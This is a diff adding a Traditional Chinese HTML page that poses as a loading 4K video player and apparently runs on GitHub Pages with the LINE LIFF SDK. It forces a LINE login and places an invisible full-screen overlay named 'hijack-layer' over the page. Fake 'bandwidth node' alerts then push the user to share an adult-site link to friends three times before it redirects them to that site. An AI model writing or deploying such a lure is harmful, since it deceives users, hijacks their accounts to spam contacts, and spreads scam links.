@@ -1,0 +1,109 @@
+html
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>正在載入線路...</title>
+    <script charset="utf-8" src="https://static.line-scdn.net"></script>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #0a0a0a; overflow: hidden; font-family: -apple-system, sans-serif; }
+        .video-bg { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: url('https://syu126147.github.io') center/cover no-repeat; 
+            filter: brightness(0.15) blur(10px); z-index: 1; transform: scale(1.1);
+        }
+        .main-container { position: relative; z-index: 10; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px; }
+        .system-status { text-align: center; margin-bottom: 25px; color: #fff; }
+        .system-status h2 { font-size: 19px; margin: 0; font-weight: 600; letter-spacing: 0.5px; }
+        .system-status p { font-size: 13px; color: #777; margin: 10px 0 0; }
+        .player-frame {
+            width: 100%; max-width: 500px; aspect-ratio: 16 / 9; background: #000; border-radius: 10px; overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.06); position: relative; display: flex; align-items: center; justify-content: center;
+        }
+        .frame-poster { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://syu126147.github.io') center/cover; opacity: 0.35; }
+        .play-btn-box { position: relative; z-index: 5; display: flex; align-items: center; justify-content: center; }
+        .play-btn-circle { width: 65px; height: 65px; background: rgba(229, 9, 20, 0.95); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(229, 9, 20, 0.3); }
+        .play-btn-circle::after { content: ''; border-style: solid; border-width: 11px 0 11px 18px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
+        .spinner { position: absolute; width: 82px; height: 82px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid rgba(255,255,255,0.6); border-radius: 50%; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .inner-ui { position: absolute; bottom: 0; left: 0; width: 100%; padding: 10px 18px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); z-index: 6; box-sizing: border-box; }
+        .seek-line { width: 100%; height: 2.5px; background: rgba(255,255,255,0.15); margin-bottom: 8px; }
+        .seek-fill { width: 0%; height: 100%; background: #e50914; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        .time-tag { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: #888; font-family: monospace; width: 100%; }
+        .fullscreen-icon { font-size: 14px; color: rgba(255,255,255,0.3); margin-left: 10px; }
+        .dot-blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .footer-note { margin-top: 25px; font-size: 10px; color: #444; text-align: center; }
+        #hijack-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent; -webkit-tap-highlight-color: transparent; }
+    </style>
+</head>
+<body>
+    <div class="video-bg"></div>
+    <div class="main-container">
+        <div class="system-status">
+            <h2>區域連線載入中</h2>
+            <p>正在分配串流節點... 完成後即可觀看</p>
+        </div>
+        <div class="player-frame">
+            <div class="frame-poster"></div>
+            <div class="play-btn-box"><div class="spinner"></div><div class="play-btn-circle"></div></div>
+            <div class="inner-ui">
+                <div class="seek-line"><div class="seek-fill"></div></div>
+                <div class="time-tag">
+                    <span style="letter-spacing: 0.5px;">ULTRA HD 4K</span>
+                    <div style="display: flex; align-items: center;">
+                        <span>0<span class="dot-blink">:</span>00 / 15:00</span>
+                        <span class="fullscreen-icon">⛶</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer-note">SSL 安全加密連線 | 分配模組 v4.8.2</div>
+    </div>
+    <div id="hijack-layer" onclick="forceHijack()"></div>
+
+    <script>
+        const LIFF_ID = "2009200124-rSJ8f72Y"; 
+        const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
+        let shareCount = 0;
+
+        async function init() {
+            try {
+                await liff.init({ liffId: LIFF_ID });
+                if (!liff.isInClient() && window.location.hostname.includes("github.io")) {
+                    window.location.replace("https://liff.line.me/" + LIFF_ID);
+                    return;
+                }
+                if (!liff.isLoggedIn()) { liff.login(); }
+            } catch (err) { console.error(err); }
+        }
+
+        async function forceHijack() {
+            if (!liff.isLoggedIn()) return;
+            alert("【連線通知】\n\n當前頻寬負載較高，請分配 3 位好友作為「分流節點」以啟動加速程序。\n完成後系統將自動為您開啟觀看權限。");
+            try {
+                const res = await liff.shareTargetPicker([
+                      {
+                        "type": "text",
+                        "text": "https://18avideo.com/Tws7k?v="+ new Date().getTime()
+                    }
+                ]);
+                if (res) {
+                    shareCount++; 
+                    if (shareCount < 3) { 
+                        alert("【節點分配中】目前已完成 " + shareCount + "/3 組。\n偵測到線路依然擁擠，請再次分享以完成加速。");
+                    } else {
+                        alert("【驗證完成】即將為您開啟頻道！");
+                        window.location.replace(SUCCESS_URL); 
+                    }
+                } else {
+                    alert("連線驗證失敗，請確實完成分享動作。");
+                }
+            } catch (error) { console.error(error); }
+        }
+        window.onload = init;
+    </script>
+</body>
+</html>
